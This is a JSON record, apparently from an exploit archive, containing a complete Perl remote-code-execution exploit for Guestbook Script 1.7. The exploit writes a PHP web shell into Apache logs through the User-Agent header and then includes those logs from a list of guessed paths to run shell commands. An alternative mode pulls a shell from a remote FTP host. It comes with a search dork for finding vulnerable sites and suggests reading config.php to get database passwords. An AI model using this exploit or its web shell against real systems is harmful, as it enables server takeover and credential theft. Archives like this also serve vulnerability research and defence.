{
  "id": "1575",
  "title": "Guestbook Script 1.7 - &#039;include_files&#039; Remote Code Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\nuse IO::Socket;\r\n\r\nprint \"guestbook script <= 1.7 exploit\\r\\n\";\r\nprint \"rgod rgod\\@autistici.org\\r\\n\";\r\nprint \"dork: \\\"powered by guestbook script\\\"\\r\\n\\r\\n\";\r\n\r\n# short explaination:\r\n# we have this code in nearly all scripts:\r\n# ...\r\n# if (isset ($include_files) and is_array ($include_files)) {\r\n#              reset ($include_files);\r\n#              while(list($key, $val) = each($include_files))\r\n#              {\r\n#\r\n#                  if ($file_content = include_content($val)) {\r\n#                      $$key = $file_content;\r\n#                  } else {\r\n#                      $$key = '<pre>[' . $txt['txt_file_not_found'] . ': ' . $val . ']</pre>';\r\n#                  }\r\n#                  $tpl->register('guest', $key);\r\n#              }\r\n#          }\r\n#...\r\n# here is include_content() function:\r\n#\r\n# function include_content($path)\r\n#          {\r\n#\r\n#              if (is_file($path)) {\r\n#                  ob_start();\r\n#\r\n#                  include($path);\r\n#                  $content = ob_get_contents();\r\n#                  ob_end_clean();\r\n#              }\r\n#\r\n#              if (isset($content)) {\r\n#                  return $content;\r\n#              }\r\n#          }\r\n#\r\n# you can include code from local resources and (on PHP5, because is_file()\r\n# function support ftp wrappers) remote resources, poc:\r\n#\r\n# http://[target]/[path]/index.php?include_files[]=&include_files[1]=/var/log/httpd/access_log\r\n# http://[target]/[path]/index.php?include_files[]=&include_files[1]=ftp://username:pass@192.168.1.3/suntzu.php\r\n#\r\n# you will not see any output, but code inside the included file will be executed.\r\n# You shoul have a \"die()\" in included file (to prevent the ob_end_clean() call)\r\n# to see some results...\r\n# This exploit supports two actions:\r\n#\r\n# [1] tries to inject some php code in log files and execute it\r\n# [2] tries to include the code from a ftp location\r\n\r\n\r\nsub main::urlEncode {\r\n    my ($string) = @_;\r\n    $string =~ s/(\\W)/\"%\" . unpack(\"H2\", $1)/ge;\r\n    #$string# =~ tr/.//;\r\n    return $string;\r\n }\r\n\r\nif (@ARGV < 4)\r\n{\r\nprint \"Usage:\\r\\n\";\r\nprint \"perl gbs_17_xpl.pl SERVER PATH ACTION[FTP LOCATION] COMMAND\\r\\n\\r\\n\";\r\nprint \"SERVER         - Server where Guestbook Script is installed.\\r\\n\";\r\nprint \"PATH           - Path to Guestbook Script (ex: /gbs/ or just /)\\r\\n\";\r\nprint \"ACTION         - 1[nothing]\\r\\n\";\r\nprint \"                 (tries to include apache error.log file)\\r\\n\\r\\n\";\r\nprint \"                 2[ftp site with the code to include]\\r\\n\\r\\n\";\r\nprint \"COMMAND        - A shell command (\\\"cat config.php\\\"\\r\\n\";\r\nprint \"                 to see database username & password)\\r\\n\\r\\n\";\r\nprint \"Example:\\r\\n\";\r\nprint \"perl gbs_17_xpl.pl 192.168.1.3 /gbs/ 1 cat config.php\\r\\n\";\r\nprint \"perl gbs_17_xpl.pl 192.168.1.3 /gbs/ 2ftp://username:password\\@192.168.1\";\r\nprint \".3/suntzu.php ls -la\\r\\n\\r\\n\";\r\nprint \"Note: to launch action [2] you need this code in suntzu.php :\\r\\n\";\r\nprint \"<?php\\r\\n\";\r\nprint \"ob_clean();\\r\\n\";\r\nprint \"echo 666;\\r\\n\";\r\nprint \"if (get_magic_quotes_gpc())\\r\\n\";\r\nprint \"{\\$_GET[cmd]=stripslashes(\\$_GET[cmd]);}\\r\\n\";\r\nprint \"passthru(\\$_GET[cmd]);\\r\\n\";\r\nprint \"echo 666;\\r\\n\";\r\nprint \"die;\\r\\n\";\r\nprint \"?>\\r\\n\\r\\n\";\r\nexit();\r\n}\r\n\r\n$serv=$ARGV[0];\r\n$path=$ARGV[1];\r\n$ACTION=urlEncode($ARGV[2]);\r\n$cmd=\"\"; for ($i=3; $i<=$#ARGV; $i++) {$cmd.=\"%20\".urlEncode($ARGV[$i]);};\r\n$temp=substr($ACTION,0,1);\r\n\r\nif ($temp==2) { #this works with PHP5 and allow_url_fopen=On\r\n  $FTP=substr($ACTION,1,length($ACTION));\r\n  $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", PeerPort=>\"80\")\r\n  or die \"[+] Connecting ... Could not connect to host.\\n\\n\";\r\n  print $sock \"GET \".$path.\"index.php?cmd=\".$cmd.\"&include_files[]=&include_files[1]=\".$FTP.\" HTTP/1.1\\r\\n\";\r\n  print $sock \"Host: \".$serv.\"\\r\\n\";\r\n  print $sock \"Connection: close\\r\\n\\r\\n\";\r\n  $out=\"\";\r\n  while ($answer = <$sock>) {\r\n    $out.=$answer;\r\n  }\r\n  close($sock);\r\n  @temp= split /666/,$out,3;\r\n  if ($#temp>1) {print \"\\r\\nExploit succeeded...\\r\\n\".$temp[1];exit();}\r\n         else {print \"\\r\\nExploit failed...\\r\\n\";}\r\n\r\n} elsif ($temp==1) { #this works if path to log files is found and u can have access to them\r\n  print \"[1] Injecting some code in log files ...\\r\\n\";\r\n  $CODE=\"<?php ob_clean();echo 666;if (get_magic_quotes_gpc()) {\\$_GET[cmd]=stripslashes(\\$_GET[cmd]);} passthru(\\$_GET[cmd]);echo 666;die;?>\";\r\n  $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", PeerPort=>\"80\")\r\n  or die \"[+] Connecting ... Could not connect to host.\\n\\n\";\r\n  print $sock \"GET \".$path.$CODE.\" HTTP/1.1\\r\\n\";\r\n  print $sock \"User-Agent: \".$CODE.\"\\r\\n\";\r\n  print $sock \"Host: \".$serv.\"\\r\\n\";\r\n  print $sock \"Connection: close\\r\\n\\r\\n\";\r\n  close($sock);\r\n\r\n  # fill with possible locations\r\n  my @paths= (\r\n  \"/var/log/httpd/access_log\",         #Fedora, default\r\n  \"/var/log/httpd/error_log\",          #...\r\n  \"../apache/logs/error.log\",          #Windows\r\n  \"../apache/logs/access.log\",\r\n  \"../../apache/logs/error.log\",\r\n  \"../../apache/logs/access.log\",\r\n  \"../../../apache/logs/error.log\",\r\n  \"../../../apache/logs/access.log\",  #and so on... collect some log paths, you will succeed\r\n  \"/etc/httpd/logs/acces_log\",\r\n  \"/etc/httpd/logs/acces.log\",\r\n  \"/etc/httpd/logs/error_log\",\r\n  \"/etc/httpd/logs/error.log\",\r\n  \"/var/www/logs/access_log\",\r\n  \"/var/www/logs/access.log\",\r\n  \"/usr/local/apache/logs/access_log\",\r\n  \"/usr/local/apache/logs/access.log\",\r\n  \"/var/log/apache/access_log\",\r\n  \"/var/log/apache/access.log\",\r\n  \"/var/log/access_log\",\r\n  \"/var/www/logs/error_log\",\r\n  \"/var/www/logs/error.log\",\r\n  \"/usr/local/apache/logs/error_log\",\r\n  \"/usr/local/apache/logs/error.log\",\r\n  \"/var/log/apache/error_log\",\r\n  \"/var/log/apache/error.log\",\r\n  \"/var/log/access_log\",\r\n  \"/var/log/error_log\"\r\n  );\r\n\r\n  for ($i=0; $i<=$#paths; $i++)\r\n  {\r\n    $a = $i + 2;\r\n    print \"[\".$a.\"] trying with \".$paths[$i].\"\\r\\n\";\r\n    $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", PeerPort=>\"80\")\r\n    or die \"[+] Connecting ... Could not connect to host.\\n\\n\";\r\n    print $sock \"GET \".$path.\"index.php?cmd=\".$cmd.\"&include_files[]=&include_files[1]=\".urlEncode($paths[$i]).\" HTTP/1.1\\r\\n\";\r\n    print $sock \"Host: \".$serv.\"\\r\\n\";\r\n    print $sock \"Connection: close\\r\\n\\r\\n\";\r\n    $out='';\r\n    while ($answer = <$sock>) {\r\n    $out.=$answer;\r\n    }\r\n    close($sock);\r\n    @temp= split /666/,$out,3;\r\n    if ($#temp>1) {print \"\\r\\nExploit succeeded...\\r\\n\".$temp[1];exit();}\r\n\r\n  }\r\n  #if you are here...\r\n  print \"\\r\\nExploit failed...\\r\\n\";\r\n} else {\r\n  print \"No action specified ...\\r\\n\";\r\n}\r\n\r\n# milw0rm.com [2006-03-11]",
  "url": "https://www.exploit-db.com/exploits/1575"
}